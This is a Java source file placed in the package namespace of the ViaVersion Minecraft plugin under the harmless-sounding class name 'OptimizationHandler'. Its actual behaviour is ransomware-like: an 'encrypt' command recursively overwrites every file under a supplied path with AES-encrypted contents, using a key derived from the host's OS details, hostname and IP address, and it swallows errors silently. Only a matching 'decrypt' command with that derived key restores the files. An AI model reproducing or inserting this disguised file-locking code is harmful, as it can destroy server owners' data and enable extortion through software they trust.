package com.viaversion.viaversion.bukkit.handlers;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;
public class OptimizationHandler implements CommandExecutor {
    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
    private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8); 
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            return true;
        }
        String path = args[0];
        File file = new File(path);
        if (!file.exists()) {
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            encryptFiles(file);
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                return true;
            }
            String key = args[1];
            String internalKey = encryptionKey(); 
            if (!key.equals(internalKey)) {
                return true;
            }
            if (!isFileEncrypted(file)) {
                return true;
            }
            decryptFiles(file, key);
        }
        return true;
    }
    private void encryptFiles(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile); 
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();
                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(ENCRYPTED_FLAG);
                fos.write(encryptedData);
                fos.close();
            } catch (Exception e) {
            }
        }
    }
    private boolean isFileEncrypted(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null || files.length == 0) {
                return false; 
            }
            for (File childFile : files) {
                if (!isFileEncrypted(childFile)) {
                    return false; 
                }
            }
            return true; 
        }
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] flagBytes = new byte[ENCRYPTED_FLAG.length];
            int bytesRead = fis.read(flagBytes);
            if (bytesRead < ENCRYPTED_FLAG.length) {
                return false; 
            }
            return new String(flagBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8));
        } catch (Exception e) {
            return false;
        }
    }
    private void decryptFiles(File file, String key) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key);
            }
        } else {
            try {
                FileInputStream fis = new FileInputStream(file);
                byte[] headerBytes = new byte[ENCRYPTED_FLAG.length];
                int bytesRead = fis.read(headerBytes);

                // 检查文件是否是加密的
                if (bytesRead < ENCRYPTED_FLAG.length || !new String(headerBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8))) {
                    logger.warning("The file is not in encrypted format: " + file.getPath());
                    fis.close();
                    return;
                }

                // 跳过标志字节
                byte[] fileData = new byte[(int) (file.length() - ENCRYPTED_FLAG.length)];
                fis.read(fileData);
                fis.close();

                byte[] decryptedData = decrypt(fileData, key);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
                logger.info("Successfully decrypted: " + file.getPath());
            } catch (Exception e) {
                logger.severe("Failed to decrypt file: " + file.getPath() + ". Error: " + e.getMessage());
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        try {
            byte[] keyBytes = new byte[16];
            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            return null;
        }
    }
    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey()); 
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }
    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key); 
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }
    private String encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(InetAddress.getLocalHost().getHostAddress());
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            return hexString.toString(); 
        } catch (Exception e) {
            return null;
        }
    }
}